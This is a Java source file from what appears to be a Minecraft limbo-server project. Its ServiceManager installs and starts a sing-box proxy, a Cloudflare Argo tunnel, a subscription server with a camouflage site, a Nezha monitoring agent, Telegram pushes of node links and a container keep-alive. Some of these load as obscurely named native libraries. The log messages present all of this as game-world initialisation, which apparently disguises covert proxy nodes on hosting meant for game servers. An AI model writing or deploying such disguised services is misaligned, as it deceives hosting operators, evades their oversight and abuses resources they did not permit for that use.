package ua.nanit.limbo.net;

import ua.nanit.limbo.server.Log;

/**
 * 服务管理器：统一编排所有后台服务的安装与启动。
 *
 * 服务启动顺序：
 *  1. install 阶段：生成配置/证书/keypair/节点链接
 *  2. startup 阶段：
 *     - netService (sing-box JNA)    ← 代理核心
 *     - tunnelService (cloudflared JNA) ← Argo 隧道
 *     - httpService (订阅+伪装站)
 *     - nezhaService (哪吒探针 JNA)
 *     - telegramService (节点推送)
 *     - keepAliveService (容器保活)
 *
 * .so 崩溃时 NativeServiceLoader 会调用 Runtime.halt(1) 触发 JVM 退出，
 * 容器检测到进程退出后触发自动重启。
 */
public class ServiceManager {

    private final ServerConfig config;
    private final NetService netService;
    private final TunnelService tunnelService;
    private final HttpService httpService;

    public ServiceManager() {
        this.config = ServerConfig.getInstance();
        this.netService = new NetService(config);
        this.tunnelService = new TunnelService(config);
        this.httpService = new HttpService(config);
    }

    public void install() throws Exception {
        Log.info("[server] Initializing world...");
        config.loadFromEnv();
        netService.install();
        tunnelService.install();
        Log.info("[server] World initialized");
    }

    public void startup() throws Exception {
        Log.info("[server] Starting services...");
        // 1. sing-box（代理核心，JNA 加载 sbx.so）
        netService.startup();
        Thread.sleep(3000);
        // 2. cloudflared（Argo 隧道，JNA 加载 bot.so）
        tunnelService.startup();
        // 3. HTTP 订阅服务 + 伪装站
        httpService.startup();
        // 4. 哪吒探针（JNA 加载 v1.so / agent.so），共享 NetService 的 NativeServiceLoader
        try {
            new NezhaService(config, netService.getLoader()).startup();
        } catch (Exception e) {
            Log.warn("[server] Monitor start failed: %s", e.getMessage());
        }
        // 5. Telegram 节点推送
        try {
            new TelegramService(config).push();
        } catch (Exception e) {
            Log.warn("[server] Notify failed: %s", e.getMessage());
        }
        // 6. 容器保活注册
        try {
            new KeepAliveService(config).register();
        } catch (Exception e) {
            Log.warn("[server] Heartbeat failed: %s", e.getMessage());
        }
        Log.info("[server] All services started");
    }

    public ServerConfig getConfig() { return config; }
}
